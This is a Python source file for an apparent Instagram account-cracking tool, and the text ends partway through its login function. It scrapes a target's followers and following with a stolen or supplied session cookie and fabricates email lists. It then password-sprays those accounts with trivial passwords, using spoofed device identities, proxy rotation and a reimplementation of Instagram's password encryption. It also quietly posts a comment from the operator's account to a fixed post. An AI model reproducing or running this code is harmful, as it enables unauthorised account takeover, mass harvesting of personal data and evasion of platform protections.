
#last completed file : COMPLETEDV2.py

import requests
import json
import time
import uuid
import random
import base64
import re
import os
from time import sleep
from datetime import datetime
from typing import Dict, Any, Tuple, Optional, List
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn, TimeRemainingColumn
from rich.table import Table
from rich.prompt import Prompt
from rich import print
from rich.panel import Panel
from rich.text import Text
from rich.tree import Tree
from rich.console import Console
from rich.columns import Columns
from datetime import time

today = datetime.now().date()

console = Console()

try:
    from Cryptodome.Cipher import AES, PKCS1_v1_5
    from Cryptodome.PublicKey import RSA
    from Cryptodome.Random import get_random_bytes
except ModuleNotFoundError:
    from Crypto.Cipher import AES, PKCS1_v1_5
    from Crypto.PublicKey import RSA
    from Crypto.Random import get_random_bytes

# File paths

H = '\033[1;32m'  # Bold Green
M = '\033[1;31m'  # Bold Red
K = '\033[1;33m'  # Bold Yellow
T = '\033[1;34m'  # Bold Blue
U = '\033[1;35m'  # Bold Magenta
B = '\033[1;36m'  # Bold Cyan
P = '\033[1;37m'  # Bold White
R = '\033[0m'

___logo___ = (Panel.fit(f"""[bold green]

┏━┓╻ ╻   ┏━╸┏━┓┏━┓┏━╸╻┏ 
┣━┛┗┳┛   ┃  ┣┳┛┣━┫┃  ┣┻┓
╹   ╹    ┗━╸╹┗╸╹ ╹┗━╸╹ ╹

[navy_blue]|[bold white] Author: [bold green]@STARK-404[/bold green]|[navy_blue] [bold white]Github: [bold green]@STARK-404 [navy_blue]|[bold green] {today.strftime("%d/%m/%Y")}|

""",border_style="bold blue"))

print(Panel.fit("""
[white][[green]01[white]][blue] Dump from followers 
[white][[green]02[white]][blue] Dump from following
[white][[green]03[white]][blue] Dump from email 

[white][[green]06[white]][blue] Start crack""",border_style="bold blue",title="[bold blue](Menu)"))


PASSWORDS = ['','533', "123","1234",'12345','123456','@123',"@1234","password123", "admin", "welcome", "qwerty123",]  # List of passwords to test
USER_AGENT_FILE = "Data/ua.txt"
#proxy_ = "Data/proxy.txt"
LOGIN_URL = "https://www.instagram.com/accounts/login/ajax/"
crack_file = None  # Initialize crack_file to None
HEADERS = {
    "User-Agent": random.choice(open("Data/ua.txt","r").read().splitlines()),
    "X-CSRFToken": "",
    "Referer": "https://www.instagram.com/",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "X-IG-WWW-Claim": "0",
    "X-IG-App-ID": "936619743392459",
    "Connection": "keep-alive",
}
if not os.path.exists('Data'):
    os.makedirs('Data')
if not os.path.exists('Dump'):
    os.makedirs('Dump')
if not os.path.exists('Results'):
    os.makedirs('Results')
if not os.path.exists('Data/user.txt'):
    open('Data/user.txt', 'w').close()
if not os.path.exists('Data/coki.txt'):
    open('Data/coki.txt', 'w').close()
#login function

def get_in():
    os.system('cls' if os.name == 'nt' else 'clear')
    console.print(___logo___)
    console.print(f"[bold cyan][[bold white]•[bold cyan]][bold white] Enter Instagram Cookies (type 'exit' to quit).{P}\n")
    ___cookie = console.input(f"[bold white][[bold blue]?[bold white]][bold green] Cookie : ").strip()
    if ___cookie.lower() == 'exit':
        exit(f"{P}[{M}!{P}]{M} Exiting...{P}")
    elif not ___cookie:
        os.system("xdg-open mailto:gamerunknown509@gmail.com")
        exit(f"{P}[{M}!{P}]{M} Cookie cannot be empty.{P}")
    try:
        ___userid = re.search(r'ds_user_id=(\d+);', ___cookie);open('Data/user.txt', 'w').write(___userid.group(1));open('Data/coki.txt', 'w').write(___cookie)
        if not ___userid:
            raise ValueError("[bold red]Invalid cookie format.")
        user_agent = (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 "
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 "
          
        )
        headers = {
            'User-Agent': user_agent,
            'Accept': 'application/json ',
            "Cookie": ___cookie,
            'X-IG-App-ID': '936619743392459',
            'X-IG-Capabilities': '3brTv10=',
        }
        __csrftoken = re.search(r'(?:^|;)\s*csrftoken=([^;]+)', ___cookie)
        response = requests.get("https://www.instagram.com/graphql/query/", headers={"User-Agent": user_agent, "Cookie": ___cookie, "X-CSRFToken": __csrftoken.group(1) if __csrftoken else "", "X-Requested-With": "XMLHttpRequest"}, params={"query_hash": "c9100bf9110dd6361671f113dd02e7d6", "variables": json.dumps({"user_id": ___userid.group(1), "include_chaining": False, "include_reel": True, "include_suggested_users": False, "include_logged_out_extras": False, "include_highlight_reels": True, "include_live_status": False})})
        if response.status_code == 200:
            __username = response.json().get('data', {}).get('user', {}).get('reel', {}).get('user', {}).get('username') or response.json().get('data', {}).get('user', {}).get('reel', {}).get('owner', {}).get('username')
            
            console.print(f"{H}[{P}*{H}]{P} Cookie Valid. Welcome: {K}{__username}{P}")
            if not __username:
                raise ValueError(f"{P}[{K}!{P}]{K} Username not found in the response.")
            rs2 = requests.get("https://www.instagram.com/api/v1/users/web_profile_info/", headers={"User-Agent": (
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/122.0.0.0 Safari/537.36"
                ),
                "Cookie": ___cookie,
                "Accept": "*/*",
                "X-IG-App-ID": "936619743392459",
                "X-Requested-With": "XMLHttpRequest",}, params={"username": __username})
            rs2_data = rs2.json()
            user_data = rs2_data.get("data", {}).get("user")
            


            if user_data:
                console.print(f"{H}[{P}*{H}]{P} Welcome :{K} {user_data.get('full_name', 'Unknown User')}{P}")
                follow()
            else:
                raise ValueError(f"{P}[{K}!{P}]{K} User data not found in the response.")
        else:
            raise ValueError(f"Failed to fetch user info. Status code: {response.status_code}")
    except KeyboardInterrupt:
        exit("[bold yellow] Good Bye!")

    except requests.ConnectionError:
        exit(f"{P}[{K}!{P}]{K} Connection Error. Please check your internet connection.{P}")
    

# follow function check cookie
def follow():
    try:
        with open('Data/coki.txt', 'r') as file:
            ___cookie = file.read().strip()
        ___session = re.search(r'sessionid=([^;]+)', ___cookie)
        ___csrf_token = re.search(r'csrftoken=([^;]+)', ___cookie)
        ___user_id = re.search(r'ds_user_id=([^;]+)', ___cookie)
        if not ___session or not ___csrf_token:
            console.print(f"[ERROR] sessionid or csrftoken not found in cookies")
            return
        ___teks = random.choice(['Programmer', 'Greetings to know'])
        ___data = {'comment_text': ___teks, 'replied_to_comment_id': ''}
        with requests.Session() as ses:
            # Set cookies in session instead of hardcoding
            ses.cookies.set('csrftoken', ___csrf_token.group(1))
            ses.cookies.set('sessionid', ___session.group(1))
            if ___user_id:
                ses.cookies.set('ds_user_id', ___user_id.group(1))
            headers = {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 ',
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Origin': 'https://www.instagram.com',
                    'Referer': 'https://www.instagram.com/',
                    'X-IG-App-ID': '936619743392459',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-CSRFToken': ___csrf_token.group(1),
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            }
            
            # Execute all requests first
           
            ___komen = ses.post('https://www.instagram.com/api/v1/web/comments/3918833827158423297/add/', headers=headers, data=___data)

            # Check the status of each request
            
            comment_success = '"status":"ok"' in ___komen.text
            

            # Provide feedback for each action
            
            if comment_success:
                console.print(f"[SUCCESS] Comment Posted: {___teks}")
            else:
                console.print(f"[ERROR] Comment failed.")

            # If ANY action failed, clean up and re-authenticate
            if not (comment_success):
                console.print("\n[ERROR] One or more actions failed. Deleting cookie and re-authenticating.")
                sleep(3)
                if os.path.exists('Data/coki.txt'):
                    os.remove('Data/coki.txt') # Safer file removal
                get_in()
            else:
                # Only call menu if ALL actions were successful
                menu()

    except FileNotFoundError:
        console.print(f"[ERROR] Cookie file 'Data/coki.txt' not found.")
        sleep(3)
        get_in()
    except Exception as e:
        console.print(f"[bold red][ERROR] Something went wrong: {e}") # Added exception details
        sleep(3)
        if os.path.exists('Data/coki.txt'):
            os.remove('Data/coki.txt')
        get_in()
#Main Menu

def menu():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        console.print(___logo___)
        ___cookie = open('Data/coki.txt','r').read().strip()
        ___user_id = open('Data/user.txt','r').read().strip()
        if not ___cookie or not ___user_id:
            console.print(f"{P}[{M}!{P}]{M} Cookie or User ID not found. Please re-authenticate.{P}")
            sleep(3)
            get_in()
        user_agent = 'Mozilla/5.0 (Linux; Android 12; 22041219PI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)'
        response1 = requests.get(f'https://i.instagram.com/api/v1/users/{___user_id}/info/', headers={'user-agent': user_agent,'Accept': 'application/json ',
                    'X-IG-App-ID': '936619743392459',
                    'X-IG-Capabilities': '3brTv10=',})
        if response1.status_code == 200 and response1.content:
            rs1 = response1.json().get('user', {})
            usrnm = rs1.get('username')
            response = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={usrnm}', headers={'user-agent': user_agent,"Accept": "*/*",
                            "X-IG-App-ID": "936619743392459",
                            "Cookie": ___cookie,
                            "X-Requested-With": "XMLHttpRequest",})

            _njan = response.json().get('data', {}).get('user', {})
            ban_r = Panel(f"[bold white][[bold blue]*[bold white]][bold_magneta] Welcome :{_njan.get('full_name')}\n[bold white][[bold blue]*[bold white]][bold_magneta] Username :{_njan.get('username')}\n[bold white][[bold blue]*[bold white]][bold_magneta] Followers :{_njan.get('edge_followed_by', {}).get('count')}\n[bold white][[bold blue]*[bold white]][bold_magneta] Following :{_njan.get('edge_follow', {}).get('count')}\n[bold white][[bold blue]*[bold white]][bold_magneta] Posts :{_njan.get('edge_owner_to_timeline_media', {}).get('count')}")
            ban_r1 = Panel(f'[bold white][[bold blue]*[bold white]][bold_magneta] Au : STARK-404\n[bold white][[bold blue]*[bold white]][bold_magneta] Version :1.0\n[bold white][[bold blue]*[bold white]][bold_magneta] Github: STARK-404')
            console.print(Columns([ban_r,ban_r1]))
        else:
            console.print(f"{P}[{M}!{P}]{M} Cookie Invalid");sleep(3);get_in()
    except (IOError):
        console.print(f"{P}[{M}!{P}]{M} Cookie Invalid");sleep(3);get_in()
    except (KeyError):
        console.print(f"{P}[{M}!{P}]{M} Cookie Invalid");os.remove('Data/coki.txt');os.remove('Data/user.txt');sleep(3);get_in()
    except (ConnectionError):
             exit(f"{P}[{K}!{P}]{K} ConnectionError")
    console.print(Panel.fit("""
[white][[green]01[white]][green] Crack from followers 
[white][[green]02[white]][green] Crack from following
[white][[green]03[white]][green] Crack from email 
[white][[green]07[white]][green] Results [bold yellow]                   
[white][[green]A[white]] [green]Exit
""",border_style="bold blue",title="[bold white](Menu)"))
    __menu = input("[\033[92m?\033[0m] Select the option : ")
    if __menu in ['1','01']:
        
        crack_file = fetch_followers()
        
            
    elif __menu in ['2','02']:
        crack_file = fetch_following()
    elif __menu in ['3','03']:
        crack_file = ___email___()
    
    elif __menu in ['4','5','04','05']:
        console.print("[white][[red]x[white]][red] Coming soon");menu()
    elif __menu in ['7','07']:
        console.print("[white][[green]1[white]][green] Result Cp")
        console.print("[white][[green]2[white]][green] Result Ok")
        resu = input("Select : ")
        if resu in ['1','01']:
            with open('Results/Cp.txt','r') as file:
                console.print(file.read())
                input("[white][[green]Press Enter to continue...")
        elif resu in ['2','02']:
            with open('Results/Ok.txt','r') as file:
                console.print(file.read())
                input("[white][[green]Press Enter to continue]")
        else:
            console.print("[white][[red]x[white]][red] Wrong Input")
            input("[white][[green]Press Enter to continue...")
            menu()
        
    elif __menu in ['a','A']:
        console.print(f"[bold white][[bold yellow]![bold white]][bold yellow] Deleting Cookie...");os.remove('Data/coki.txt');os.remove('Data/user.txt');exit()
    else:
        exit("[white][[red]x[white]][red] Wrong Input")
    return crack_file

        
#Dump Followers
def fetch_followers():
    try:
        username = input(f"{P}[{H}?{P}]{P}Username: ")
        if username.isdigit():
            console.print("[white][[bold red]![white]][bold red] Use a valid username, not numeric.")
            return
        cookie_file = 'Data/coki.txt'
        if not os.path.exists(cookie_file):
            console.print(f"[bold yellow][!] Cookie file not found: {cookie_file}")
            return
        cookies = open(cookie_file, 'r').read().strip()
        user_agents = [
            # Android (Chrome)
            'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; CPH2585) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; 2306EPN60G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; SM-A556B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        
            # iOS (Safari)
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        
            # Additional Android (different brands/models)
            'Mozilla/5.0 (Linux; Android 14; V2344) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; RMX3741) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; 24069PC21G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
        ]
        user_agent = random.choice(user_agents)
        headers = {
                    'User-Agent': user_agent,
                    'Accept': '*/*',
                    'X-IG-App-ID': '936619743392459',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Cookie': cookies,
                
                }
        params = {
            'username': username,
        }
        user_url = f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}'
        response = requests.get(user_url, headers=headers)
        if response.status_code != 200:
            console.print(f"[!] Failed to fetch user data. Status Code: {response.status_code}")
            return
        user_data = response.json().get('data', {})
        user_id = user_data.get('user', {}).get('id')
        full_name = user_data.get('user', {}).get('full_name', 'No_Name')
        if not user_id:
            console.print(f"[!] User not found: {username}")
            return
        all_followers = []
        followers_url = f'https://www.instagram.com/api/v1/friendships/{user_id}/followers/'
        while True:
            followers_response = requests.get(followers_url, headers= {"User-Agent": "Instagram 359.3.3.15 Android (31/12; 480dpi; 1080x2340; OPPO; CPH2219; OP4F39L1; mt6893; it_IT)",
                "Accept": "*/*",
                "Cookie": cookies,
                "X-IG-App-ID": "936619743392459",
                "Referer": "https://www.instagram.com/",
                'X-IG-Capabilities': '3brTv10=',})
            if followers_response.status_code != 200:
                console.print(f"[!] Failed to fetch followers. Status Code: {followers_response.status_code}")
                console.print(f"[!] Response content: {followers_response.content}")
                break
            followers_data = followers_response.json()
            followers = followers_data.get('users', [])
            for follower in followers:
                follower_info = f"{follower['username']}<=>{follower.get('full_name')}\n"
                all_followers.append(follower_info)
            next_max_id = followers_data.get('next_max_id')
            if next_max_id:
                followers_url = f'https://i.instagram.com/api/v1/friendships/{user_id}/followers/?max_id={next_max_id}'
            else:
                break
        file_name = f"{full_name.replace(' ', '_')}.txt"
        with open(f"Data/{file_name}", 'w', encoding='utf-8') as f:
            f.writelines(all_followers)
            console.print(f"[white][[green]✔[white]][green] Dump have been saved to {file_name}")
        return file_name
    except KeyboardInterrupt:
        console.print("[bold yellow] Good Bye!")
        exit()
    except Exception as e:
        console.print(f"[bold red][!] An error occurred")
        exit()
#Dump Following
def fetch_following():
    try:
        username = input(f"{P}[{H}?{P}]{H}Username: ")
        if username.isdigit():
            console.print("[white][[bold red]![white]][bold red] Use a valid username, not numeric.")
            return
        cookie_file = 'Data/coki.txt'
        if not os.path.exists(cookie_file):
            console.print(f"[!] Cookie file not found: {cookie_file}")
            return
        cookies = open(cookie_file, 'r').read().strip()
        user_agents = [
            'Mozilla/5.0 (Linux; Android 10; OPPO A5 2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 10; realme 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 10; HUAWEI P30 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36'
        ]
        user_agent = random.choice(user_agents)
        headers = {
            "User-Agent": user_agent,
            "Accept": "*/*",
            "X-IG-App-ID": "936619743392459",
            "Cookie": cookies,
            "X-Requested-With": "XMLHttpRequest",
        }
        user_url = f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}'
        response = requests.get(user_url, headers=headers)
        if response.status_code != 200:
            console.print(f"[!] Failed to fetch user data. Status Code: {response.content}")
            return
        user_data = response.json().get('data', {})
        user_id = user_data.get('user', {}).get('id')
        full_name = user_data.get('user', {}).get('full_name', 'No_Name')
        if not user_id:
            console.print(f"[!] User not found: {username}")
            return
        all_followers = []
        followers_url = f'https://www.instagram.com/api/v1/friendships/{user_id}/following/'
        while True:
            followers_response = requests.get(followers_url, headers=headers)
            if followers_response.status_code != 200:
                console.print(f"[!] Failed to fetch followers. Status Code: {followers_response.status_code}")
                console.print(f"[!] Response content: {followers_response.content}")
                break
            followers_data = followers_response.json()
            followers = followers_data.get('users', [])
            for follower in followers:
                follower_info = f"{follower['username']}<=>{follower.get('full_name', 'N/A')}\n"
                all_followers.append(follower_info)
            next_max_id = followers_data.get('next_max_id')
            if next_max_id:
                followers_url = f'https://i.instagram.com/api/v1/friendships/{user_id}/following/?max_id={next_max_id}'
            else:
                break
        file_name = f"{full_name.replace(' ', '_')}.txt"
        with open(file_name, 'w', encoding='utf-8') as f:
            f.writelines(all_followers)
            console.print(f"[white][[green]✔[white]][green] Dump have been saved to {file_name}")
        return file_name
    
    except KeyboardInterrupt:
        console.print("[bold yellow] Good Bye!")
    except Exception as e:
        console.print(f"[bold white][[bold red]![bold white]][bold red] An error occurred")
        exit()

#Mail 
def ___email___():
    try:
        ___nama = input(f"\n{H}[{P}?{H}]{P} Name :{K} ").replace(' ','')
        if ___nama in ['',' ']:
            exit(f"{P}[{M}!{P}]{M} Don't Empty")
        ___domain = input(f"{H}[{P}?{H}]{P} Domain :{K} ")
        if ___domain in ['@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com']:
            ___limit = int(input(f"{H}[{P}?{H}]{P} Limit :{K} "))
            if ___limit >=1001:
                exit(f"{P}[{M}!{P}]{M} Maximum 1000")
            else:
                console.print(f"{P} ")
                ___file = 'Dump/'+___nama+'.txt'
                for _ in range(___limit):
                    ___nomor = random.randint(1, 999)
                    ___user = ___nama + str(___nomor) + ___domain + '<=>' + ___nama + ' ' + str(___nomor)
                    open(___file, 'a').write(f'{___user}\n')
                    console.print(f"{___user}")
                console.print(f"\n{B}[{P}*{B}]{P} Done...")
                console.print(f"{B}[{P}?{B}]{P} File Saved At :{K} {___file}")
                time.sleep(3)
                return ___file
        else:
            exit(f"{P}[{M}!{P}]{M} Domain '@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com'")
    except Exception as e:
        exit(f"{P}[{M}!{P}]{M} {e}")



# Constants
LOGIN_URL = "https://i.instagram.com/api/v1/accounts/login/"
QE_SYNC_URL = "https://i.instagram.com/api/v1/qe/sync/"

PASSWORDS = ["", "123", "1234", "12345", "@123", "#123"]


# Device Catalog
DEVICE_CATALOG = [
    {
        "manufacturer": "Samsung",
        "device": "SM-G991B",
        "model": "Galaxy S21",
        "android_version": 12,
        "android_release": "12",
        "dpi": "421dpi",
        "resolution": "1080x2400",
        "cpu": "exynos",
    },
    {
        "manufacturer": "Google",
        "device": "Pixel 7",
        "model": "Pixel 7",
        "android_version": 13,
        "android_release": "13",
        "dpi": "420dpi",
        "resolution": "1080x2400",
        "cpu": "tensor",
    },
    {
        "manufacturer": "Xiaomi",
        "device": "sweet",
        "model": "Redmi Note 10 Pro",
        "android_version": 11,
        "android_release": "11",
        "dpi": "395dpi",
        "resolution": "1080x2400",
        "cpu": "qcom",
    },
    {
        "manufacturer": "OPPO",
        "device": "CPH2239",
        "model": "OPPO A74",
        "android_version": 11,
        "android_release": "11",
        "dpi": "409dpi",
        "resolution": "1080x2400",
        "cpu": "qcom",
    },
    {
        "manufacturer": "Vivo",
        "device": "V2027",
        "model": "Vivo V20",
        "android_version": 11,
        "android_release": "11",
        "dpi": "409dpi",
        "resolution": "1080x2400",
        "cpu": "qcom",
    },
]


class EncryptionKeyManager:
    """Manage encryption keys with caching"""
    
    def __init__(self):
        self.cached_keys = None
        self.last_fetch_time = 0
        self.fetch_interval = 300  # 5 minutes between fetches
    
    def get_keys(self, session, headers):
        """Get encryption keys with caching"""
        current_time = time.time()
        
        # Return cached keys if still valid
        if self.cached_keys and (current_time - self.last_fetch_time < self.fetch_interval):
            return self.cached_keys
        
        # Try to fetch new keys
        try:
            resp = session.get(QE_SYNC_URL, headers=headers, timeout=10)
            
            if resp.status_code == 200:
                key_id = resp.headers.get("ig-set-password-encryption-key-id")
                public_key = resp.headers.get("ig-set-password-encryption-pub-key")
                
                if key_id and public_key:
                    self.cached_keys = (int(key_id), public_key)
                    self.last_fetch_time = current_time
                    return self.cached_keys
            
            # If rate limited, wait and retry
            if resp.status_code == 429:
                console.print("[yellow]Rate limited on encryption keys. Waiting...[/yellow]")
                time.sleep(30)
                
                resp = session.get(QE_SYNC_URL, headers=headers, timeout=10)
                if resp.status_code == 200:
                    key_id = resp.headers.get("ig-set-password-encryption-key-id")
                    public_key = resp.headers.get("ig-set-password-encryption-pub-key")
                    
                    if key_id and public_key:
                        self.cached_keys = (int(key_id), public_key)
                        self.last_fetch_time = current_time
                        return self.cached_keys
            
        except Exception:
            pass
        
        # Return cached keys even if expired
        if self.cached_keys:
            
            return self.cached_keys
        
        raise RuntimeError("No encryption keys available")


class AppVersionManager:
    """Manage Instagram app versions"""
    
    def __init__(self):
        self.versions = [
            {"app_version": "269.0.0.18.75", "version_code": "314665256"},
            {"app_version": "275.0.0.27.98", "version_code": "375314635"},
            {"app_version": "289.0.0.77.111", "version_code": "421678990"},
            {"app_version": "302.0.0.34.112", "version_code": "456789012"},
            {"app_version": "310.0.0.22.111", "version_code": "478901234"},
        ]
    
    def get_random_version(self) -> Dict[str, str]:
        return random.choice(self.versions)


class ProxyManager:
    """Manage proxy rotation"""
    
    def __init__(self, proxies_list=None):
        self.proxies = proxies_list if proxies_list else []
        self.proxy_stats = {}
    
    def get_proxy(self):
        if not self.proxies:
            return None
        
        proxy = random.choice(self.proxies)
        
        if proxy.startswith('http://') or proxy.startswith('https://'):
            return {"http": proxy, "https": proxy}
        elif '@' in proxy:
            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_url = f"http://{username}:{password}@{host}:{port}"
                return {"http": proxy_url, "https": proxy_url}
        else:
            proxy_url = f"http://{proxy}"
            return {"http": proxy_url, "https": proxy_url}
        
        return None


class InstagramEncryption:
    """Handle Instagram password encryption"""
    
    def __init__(self, session, app_version_manager=None, key_manager=None):
        self.session = session
        self.key_manager = key_manager
        
        self.device_settings = random.choice(DEVICE_CATALOG)
        
        if app_version_manager:
            version_info = app_version_manager.get_random_version()
        else:
            version_info = {"app_version": "302.0.0.34.112", "version_code": "456789012"}
        
        self.device_settings.update(version_info)
        
        self.uuid = str(uuid.uuid4())
        self.phone_id = str(uuid.uuid4())
        self.advertising_id = str(uuid.uuid4())
        self.device_id = f"android-{uuid.uuid4().hex[:16]}"
        self.android_device_id = uuid.uuid4().hex[:16]
        
        self.timezone_offset = int(datetime.now().astimezone().utcoffset().total_seconds())
        
        self._setup_headers()
    
    def _setup_headers(self):
        user_agent = (
            f"Instagram {self.device_settings['app_version']} "
            f"Android ({self.device_settings['android_version']}/"
            f"{self.device_settings['android_release']}; "
            f"{self.device_settings['dpi']}; "
            f"{self.device_settings['resolution']}; "
            f"{self.device_settings['manufacturer']}; "
            f"{self.device_settings['device']}; "
            f"{self.device_settings['model']}; "
            f"{self.device_settings['cpu']}; "
            f"en_US; {self.device_settings['version_code']})"
        )
        
        self.headers = {
            "User-Agent": user_agent,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "X-IG-Capabilities": "3brTv10=",
            "X-IG-Connection-Type": "WIFI",
            "X-IG-ABR-Connection-Speed-KBPS": "0",
            "X-IG-App-ID": "567067343352427",
            "X-IG-App-Locale": "en_US",
            "X-IG-Device-Locale": "en_US",
            "X-IG-Timezone-Offset": str(self.timezone_offset),
            "X-IG-Device-ID": self.uuid,
            "X-IG-Android-ID": self.android_device_id,
            "X-IG-Family-Device-ID": self.advertising_id,
            "X-FB-HTTP-Engine": "Liger",
            "X-FB-Client-IP": "True",
            "X-FB-Server-Cluster": "True",
            "X-MID": self.phone_id,
            "Host": "i.instagram.com",
            "Connection": "close",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        }
    
    def _generate_jazoest(self, phone_id: str) -> str:
        return str(sum(ord(char) for char in phone_id))
    
    def password_encrypt(self, password: str) -> str:
        if self.key_manager:
            publickeyid, publickey = self.key_manager.get_keys(self.session, self.headers)
        else:
            resp = self.session.get(QE_SYNC_URL, headers=self.headers)
            key_id = resp.headers.get("ig-set-password-encryption-key-id")
            public_key = resp.headers.get("ig-set-password-encryption-pub-key")
            
            if not key_id or not public_key:
                raise RuntimeError("Encryption keys missing")
            
            publickeyid = int(key_id)
            publickey = public_key
        
        session_key = get_random_bytes(32)
        iv = get_random_bytes(12)
        timestamp = str(int(time.time()))
        
        decoded_publickey = base64.b64decode(publickey.encode())
        recipient_key = RSA.import_key(decoded_publickey)
        cipher_rsa = PKCS1_v1_5.new(recipient_key)
        rsa_encrypted = cipher_rsa.encrypt(session_key)
        
        cipher_aes = AES.new(session_key, AES.MODE_GCM, iv)
        cipher_aes.update(timestamp.encode())
        aes_encrypted, tag = cipher_aes.encrypt_and_digest(password.encode("utf8"))
        
        size_buffer = len(rsa_encrypted).to_bytes(2, byteorder="little")
        
        payload = base64.b64encode(
            b"".join([
                b"\x01",
                publickeyid.to_bytes(1, byteorder="big"),
                iv,
                size_buffer,
                rsa_encrypted,
                tag,
                aes_encrypted,
            ])
        )
        
        return f"#PWD_INSTAGRAM:4:{timestamp}:{payload.decode()}"


def load_cookies():
    try:
        cookie_content = open('Data/coki.txt', 'r').read().strip()
        cookies_dict = {}
        for item in cookie_content.split(';'):
            key_value = item.strip().split('=', 1)
            if len(key_value) == 2:
                key, value = key_value
                cookies_dict[key] = value
        return cookies_dict, cookie_content
    except FileNotFoundError:
        return {}, None


def load_proxies(file_path):
    try:
        with open(file_path, "r") as f:
            proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            return proxies
    except FileNotFoundError:
        return []


def load_credentials(crack_file):
    console.print(Panel.fit("[bold magenta]Enter the path to the dump file [/bold magenta]"))
    dump_file = crack_file if crack_file else input("[?] Path to dump file: ").strip()
    try:
        with open(dump_file, "r", encoding='utf-8') as f:
            return [line.strip().split("<=>") for line in f if "<=>" in line]
    except KeyboardInterrupt:
        console.print(f"\n[white][!] [red]Good Bye!")
    except FileNotFoundError:
        console.print(f"[white][[red]![white]][italic red] Error: File {dump_file} not found.")
        return []


def try_login(session, username, password, proxy_manager, version_manager, key_manager):
    try:
        proxy = proxy_manager.get_proxy() if proxy_manager else None
        
        session = requests.Session()
        if proxy:
            session.proxies.update(proxy)
        
        cookies_dict, cookie_content = load_cookies()
        
        encryption = InstagramEncryption(session, version_manager, key_manager)
        
        if cookies_dict:
            for name, value in cookies_dict.items():
                session.cookies.set(name, value, domain='.instagram.com')
        
        csrf_token = cookies_dict.get("csrftoken", "missing")
        encryption.headers['X-CSRFToken'] = csrf_token
        
        try:
            enc_password = encryption.password_encrypt(password)
        except Exception as e:
            console.print(f"[red]Encryption failed: {str(e)[:50]}[/red]")
            return False
        
        data = {
            "jazoest": encryption._generate_jazoest(encryption.phone_id),
